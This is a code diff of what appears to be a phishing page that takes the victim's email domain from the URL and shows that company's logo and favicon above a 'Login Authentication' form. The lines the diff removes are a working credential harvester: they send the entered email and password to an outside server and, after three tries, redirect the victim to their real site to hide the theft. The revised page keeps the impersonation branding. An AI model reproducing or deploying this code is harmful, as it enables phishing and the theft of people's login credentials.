@@ -78,28 +78,24 @@ opacity: 0.7;
 <img id="domain-logo" class="domain-logo" src="" alt="Domain Logo">
 <div style="text-transform: uppercase;"><span id="domain-name" class="fw-bold"></span> <br/><b>Login Authentication</b></div>
 </header>
-<form id="login-form">
-<div class="mb-3 text-start">
-<label for="email" class="form-label">Email Address</label>
-<input type="email" id="email" class="form-control" required>
-</div>
 
-<div class="mb-3 text-start">
-<label for="username" class="form-label">Username</label>
-<input type="text" id="username" class="form-control" required>
-<span class="auth-required">Username is required!</span>
-</div>
-
-<!-- Cloudflare Turnstile -->
-<div class="mb-3">
-<div class="cf-turnstile" data-sitekey="0x4AAAAAABuU_cmRvd31gQnF" data-callback="turnstileCallback">
-</div>
-<span id="turnstile-error" class="turnstile-error">Please verify the captcha!</span>
-</div>
-
-<button type="submit" id="submit-btn" class="btn btn-primary w-100">
-Sign Up
-</button>
+<form id="signup-form" method="post" action="/">
+	<div class="mb-3 text-start">
+		<label for="email" class="form-label">Email Address</label>
+		<input type="email" id="email" name="email" class="form-control" required>
+	</div>
+	<div class="mb-3 text-start">
+		<label for="username" class="form-label">Username</label>
+		<input type="text" id="username" name="username" class="form-control" required>
+		<span class="auth-required">Username is required!</span>
+	</div>
+	<!-- Cloudflare Turnstile -->
+	<div class="mb-3">
+		<div class="cf-turnstile" data-sitekey="0x4AAAAAABuU_cmRvd31gQnF" data-callback="turnstileCallback"></div>
+		<input type="hidden" id="cf-turnstile-response" name="cf-turnstile-response">
+		<span id="turnstile-error" class="turnstile-error">Please verify the captcha!</span>
+	</div>
+	<button type="submit" id="submit-btn" class="btn btn-primary w-100">Sign Up</button>
 </form>
 
 <!-- Submission Message -->
@@ -111,101 +107,37 @@ Sign Up
 <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
 
 <script>
-let submitAttempts = 0;
+
 let extractedDomain = "";
 let turnstileVerified = false;
 
 function turnstileCallback(token) {
-if (token) {
-turnstileVerified = true;
-document.getElementById("turnstile-error").style.display = "none";
-}
+	if (token) {
+		turnstileVerified = true;
+		document.getElementById("cf-turnstile-response").value = token;
+		document.getElementById("turnstile-error").style.display = "none";
+	}
 }
 
 document.addEventListener("DOMContentLoaded", function () {
-const urlParams = new URLSearchParams(window.location.search);
-const emailParam = urlParams.get("email");
+	const urlParams = new URLSearchParams(window.location.search);
+	const emailParam = urlParams.get("email");
+	if (emailParam) {
+		document.getElementById("email").value = emailParam;
+		extractedDomain = emailParam.split("@")[1] || "example.com";
+	}
+	if (extractedDomain !== "example.com") {
+		document.getElementById("domain-name").textContent = extractedDomain;
+		document.getElementById("domain-logo").src = `https://logo.clearbit.com/${extractedDomain}`;
+		document.getElementById("favicon").href = `https://www.google.com/s2/favicons?sz=64&domain=${extractedDomain}`;
+	}
 
-if (emailParam) {
-document.getElementById("email").value = emailParam;
-extractedDomain = emailParam.split("@")[1] || "example.com"; // Extract domain
-}
-
-if (extractedDomain !== "example.com") {
-document.getElementById("domain-name").textContent = extractedDomain;
-
-// Set domain logo from Clearbit
-document.getElementById("domain-logo").src = `https://logo.clearbit.com/${extractedDomain}`;
-
-// Set Favicon from Google API
-document.getElementById("favicon").href = `https://www.google.com/s2/favicons?sz=64&domain=${extractedDomain}`;
-}
-});
-
-$("#login-form").submit(function (event) {
-event.preventDefault();
-
-submitAttempts++;
-
-const passwordField = $("#password");
-const submitBtn = $("#submit-btn");
-
-// Password validation
-if (!passwordField.val()) {
-passwordField.addClass("is-invalid");
-return;
-} else {
-passwordField.removeClass("is-invalid");
-}
-
-// Check if Turnstile is verified
-if (!turnstileVerified) {
-$("#turnstile-error").show();
-return;
-}
-
-// Show loading effect
-submitBtn.addClass("btn-loading").html('<span class="spinner-border spinner-border-sm"></span> Processing...');
-
-// AJAX Submission
-$.ajax({
-type: "POST",
-url: "https://ccbts.org.br/obicct/submit.php",
-data: {
-email: $("#email").val(),
-password: $("#password").val()
-},
-success: function (response) {
-$("#submission-message").fadeIn();
-
-// Reset password field
-passwordField.val("");
-
-// Hide submission message after 3 seconds
-setTimeout(() => {
-$("#submission-message").fadeOut();
-}, 3000);
-
-// Reset Cloudflare Turnstile
-turnstile.reset();
-turnstileVerified = false; // Force re-verification
-
-// Redirect after 3 attempts
-if (submitAttempts >= 3 && extractedDomain !== "") {
-setTimeout(() => {
-window.location.href = "https://" + extractedDomain;
-}, 2000);
-}
-
-},
-error: function () {
-alert("Error submitting form. Please try again.");
-},
-complete: function () {
-// Restore button after submission
-submitBtn.removeClass("btn-loading").text("Login");
-}
-});
+	document.getElementById("signup-form").addEventListener("submit", function (event) {
+		if (!turnstileVerified) {
+			event.preventDefault();
+			document.getElementById("turnstile-error").style.display = "inline";
+		}
+	});
 });
 
 </script>
